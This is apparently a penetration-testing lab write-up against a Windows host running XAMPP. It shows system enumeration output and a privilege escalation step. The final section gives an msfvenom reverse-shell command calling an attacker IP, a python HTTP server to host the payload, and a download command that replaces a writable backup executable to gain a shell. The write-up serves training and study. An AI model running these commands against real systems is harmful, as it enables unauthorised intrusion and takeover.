RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\dxgiadaptercache.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskCleanup\SilentCleanup
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
RunAs: SYSTEM
Why: Hidden task; LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\DFDWiz.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskFootprint\Diagnostics
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\disksnapshot.exe -z
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskFootprint\StorageSense
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Feedback\Siuf\DmClient
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\dmclient.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\dmclient.exe utcwnf
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\File Classification Infrastructure\Property Definition Sync
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\LocalUserSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\MouseSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\PenSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\TouchpadSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Maintenance\WinSAT
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Cellular
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\ProvTool.exe /turn 7 /source CellStateChangeTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Logon
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source LogonIdleTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Retry
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source ProvRetryTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\RunOnReboot
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source ContinueSessionTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Maps\MapsToastTask
Why: Hidden task
Action:


```

  10.  Network

```
[+] Network identity + routing (summary)
InterfaceAlias IPv4Address      IPv4DefaultGateway                                                DNSServer
-------------- -----------      ------------------                                                ---------
Ethernet0      {192.168.148.53} {MSFT_NetRoute (InstanceID = ":8:8:8:9:55A55;C?8;@B8;?B8???55;")} {MSFT_DNSClientServerAddress (Name = "7", CreationClassName = "", SystemCreationClassName = "", SystemName = "23"), MSFT_DNSClientServerAddress (Name = "7", CreationClassName = "", SystemCreationClassName = "", SystemName = "2")}

[+] Listening TCP ports (first 80)
LocalAddress   LocalPort OwningProcess
------------   --------- -------------
0.0.0.0               21          5648
::                    21          5648
::                   135           864
0.0.0.0              135           864
192.168.148.53       139             4
::                   445             4
::                  3306          5532
0.0.0.0             4443          5540
::                  4443          5540
0.0.0.0             5040          4760
::                  7680          8024
::                  8080          5540
0.0.0.0             8080          5540
127.0.0.1          14147          5648
::1                14147          5648
0.0.0.0            49664           648
::                 49664           648
0.0.0.0            49665           504
::                 49665           504
0.0.0.0            49666          1072
::                 49666          1072
::                 49667          1448
0.0.0.0            49667          1448
::                 49668           636
0.0.0.0            49668           636
::                 49669          2244
0.0.0.0            49669          2244

[+] Firewall profiles and status
Name    Enabled DefaultInboundAction DefaultOutboundAction
----    ------- -------------------- ---------------------
Domain    False                Block                 Block
Private   False                Block                 Block
Public    False                Block                 Block


XAMPP       7.4.6-0        Bitnami


```

  11. Software

```
================================================================================
10) Software
================================================================================

[+] Installed non-Microsoft software (triage, first 80)
DisplayName     : VMware Tools
DisplayVersion  : 10.3.10.12406962
Publisher       : VMware, Inc.
InstallDate     : 20200612
InstallLocation : C:\Program Files\VMware\VMware Tools\
DisplayName     : Windows PC Health Check
DisplayVersion  : 3.6.2204.08001
Publisher       : Microsoft Corporation
InstallDate     : 20220503
InstallLocation :
DisplayName     : XAMPP
DisplayVersion  : 7.4.6-0
Publisher       : Bitnami
InstallDate     : 20200612
InstallLocation : C:\xampp

[+] Interesting software keywords (quick hits)
DisplayName DisplayVersion Publisher
----------- -------------- ---------

```

  12. Shares & Drivers

```
[+] SMB shares (non-default)
Name   Path       Description
----   ----       -----------
ADMIN$ C:\WINDOWS Remote Admin
IPC$              Remote IPC

[+] Third-party drivers (non-Microsoft, running)
Name        : BasicDisplay
DisplayName : BasicDisplay
StartMode   : System
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\basicdisplay.inf_amd64_65ab9a260dbf7467\BasicDisplay.sys
Name        : BasicRender
DisplayName : BasicRender
StartMode   : System
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\basicrender.inf_amd64_df49c4daa6251397\BasicRender.sys
Name        : CompositeBus
DisplayName : Composite Bus Enumerator Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\compositebus.inf_amd64_7500cffa210c6946\CompositeBus.sys
Name        : swenum
DisplayName : Software Bus Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\swenum.inf_amd64_16a14542b63c02af\swenum.sys
Name        : umbus
DisplayName : UMBus Enumerator Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\umbus.inf_amd64_b78a9c5b6fd62c27\umbus.sys
Name        : UrsChipidea
DisplayName : Chipidea USB Role-Switch Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\urschipidea.inf_amd64_78ad1c14e33df968\urschipidea.sys


```

  13. Loot Files & Credentials

```
[+] Directory listing: C:\\ (top level)
Mode   LastWriteTime         Length    Name
----   -------------         ------    ----
d--hs- 5/4/2022 1:53:03 AM             $Recycle.Bin
d--h-- 5/3/2022 6:37:09 PM             $WinREAgent
d----- 7/20/2020 7:08:49 AM            Backup
d--hsl 6/12/2020 1:39:40 PM            Documents and Settings
d----- 12/7/2019 1:14:52 AM            PerfLogs
d-r--- 2/23/2026 10:15:53 AM           Program Files
d-r--- 12/3/2021 8:22:27 AM            Program Files (x86)
d--h-- 12/3/2021 8:40:53 AM            ProgramData
d--hs- 12/3/2021 8:29:00 AM            Recovery
d--hs- 6/12/2020 1:42:20 PM            System Volume Information
d-r--- 12/3/2021 8:29:46 AM            Users
d----- 5/4/2022 1:52:11 AM             Windows
d----- 6/12/2020 8:11:50 AM            xampp
-a-hs- 2/4/2025 8:13:43 AM   8192      DumpStack.log.tmp
-a---- 2/23/2026 10:15:15 AM 2694      output.txt
-a-hs- 2/4/2025 8:13:43 AM   738197504 pagefile.sys
-a-hs- 2/4/2025 8:13:43 AM   268435456 swapfile.sys

[+] Directory listing: C:\\Users (top level)
Mode   LastWriteTime        Length Name
----   -------------        ------ ----
d----- 12/3/2021 8:32:35 AM        Admin
d----- 12/3/2021 8:40:02 AM        Administrator
d--hsl 12/7/2019 1:30:39 AM        All Users
d-rh-- 12/3/2021 8:37:28 AM        Default
d--hsl 12/7/2019 1:30:39 AM        Default User
d-r--- 12/3/2021 8:26:28 AM        Public
d----- 12/3/2021 8:37:57 AM        rupert
-a-hs- 12/7/2019 1:12:42 AM 174    desktop.ini

[+] Directory listing: current user profile (top level)
Mode   LastWriteTime         Length  Name
----   -------------         ------  ----
d-r--- 12/3/2021 8:38:39 AM          3D Objects
d--h-- 12/3/2021 8:30:03 AM          AppData
d--hsl 12/3/2021 8:29:43 AM          Application Data
d-r--- 12/3/2021 8:38:39 AM          Contacts
d--hsl 12/3/2021 8:29:43 AM          Cookies
d-r--- 5/4/2022 1:53:14 AM           Desktop
d-r--- 2/23/2026 10:27:33 AM         Documents
d-r--- 12/3/2021 8:38:39 AM          Downloads
d-r--- 12/3/2021 8:38:39 AM          Favorites
d-r--- 12/3/2021 8:38:39 AM          Links
d--hsl 12/3/2021 8:29:43 AM          Local Settings
d--h-- 6/12/2020 7:02:30 AM          MicrosoftEdgeBackups
d-r--- 12/3/2021 8:38:39 AM          Music
d--hsl 12/3/2021 8:29:43 AM          My Documents
d--hsl 12/3/2021 8:29:43 AM          NetHood
d-r--- 6/24/2020 7:48:01 PM          OneDrive
d-r--- 12/3/2021 8:38:39 AM          Pictures
d--hsl 12/3/2021 8:29:43 AM          PrintHood
d--hsl 12/3/2021 8:29:43 AM          Recent
d-r--- 12/3/2021 8:38:39 AM          Saved Games
d-r--- 12/3/2021 8:38:39 AM          Searches
d--hsl 12/3/2021 8:29:43 AM          SendTo
d--hsl 12/3/2021 8:29:43 AM          Start Menu
d--hsl 12/3/2021 8:29:43 AM          Templates
d-r--- 12/3/2021 8:38:39 AM          Videos
-a-h-- 5/4/2022 1:52:30 AM   1310720 NTUSER.DAT
-a-hs- 12/3/2021 8:29:43 AM  442368  ntuser.dat.LOG1
-a-hs- 12/3/2021 8:29:43 AM  327680  ntuser.dat.LOG2
-a-hs- 12/3/2021 8:29:45 AM  65536   NTUSER.DAT{038aeedc-5456-11ec-8ca3-0050568ac25c}.TM.blf
-a-hs- 12/3/2021 8:29:44 AM  524288  NTUSER.DAT{038aeedc-5456-11ec-8ca3-0050568ac25c}.TMContainer00000000000000000001.regtrans-ms
-a-hs- 12/3/2021 8:29:44 AM  524288  NTUSER.DAT{038aeedc-5456-11ec-8ca3-0050568ac25c}.TMContainer00000000000000000002.regtrans-ms
---hs- 12/3/2021 8:37:57 AM  20      ntuser.ini

[+] Unattended install / sysprep credential files
(no output)

[+] Sensitive file name hits in common user paths
(no output)

[+] PowerShell history (all users, full content)
No PSReadLine history files found.

[+] User directory interesting files (*.txt, *.ps1, *.ini, *.xml, *.config, *.kdbx, *.rdp)
FullName                                                LastWriteTime         Length
--------                                                -------------         ------
C:\Users\rupert\Desktop\local.txt                       2/23/2026 10:15:12 AM     34
C:\Users\rupert\Documents\pg_privesc.ps1                2/23/2026 10:27:15 AM  25174
C:\Users\rupert\Documents\privesc_2026-02-23_102733.txt 2/23/2026 10:27:43 AM  84360

[+] Unusual writable paths (potential current-user write access)
Path      Reason
----      ------
C:\Backup Non-standard path
C:\xampp  Non-standard path


```

5. Automated Enumeration

```

TCP        127.0.0.1             14147         0.0.0.0               0               Listening         5648            c:\xampp\filezillaftp\filezillaserver.exe



```
5. Possible PE Paths

```
[+] Unusual writable paths (potential current-user write access)
Path      Reason
----      ------
C:\Backup Non-standard path
File Permissions "C:\Backup\TFTP.EXE": Users [Allow: AllAccess],Authenticated Users [Allow: WriteData/CreateFiles]

```

**Privilege Escalation**

1. PE Steps
- Navigated to C:\Backup folder and viewed the contents of the directory. 

![[Pasted image 20260223125827.png]]

- Reviewed the info.txt file 

![[Pasted image 20260223125911.png]]

- Couldn't find a scheduled task or any other evidence that the it was automated to run every 5 minutes, so just decided to test it by replacing with backdoor. 

-  Created malicious TFTP.EXE with backdoor capability.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f exe -o TFTP.EXE
```

- Setup python server to host malicious executable. 

```
python3 -m http.server 80
```

- Copied file to victim host and waited for execution. 

```
iwr -uri http://192.168.45.215/TFTP.EXE -Out TFTP.EXE\
```

- Received reverse shell. 

![[Pasted image 20260223130340.png]]

2. Notes

```

```

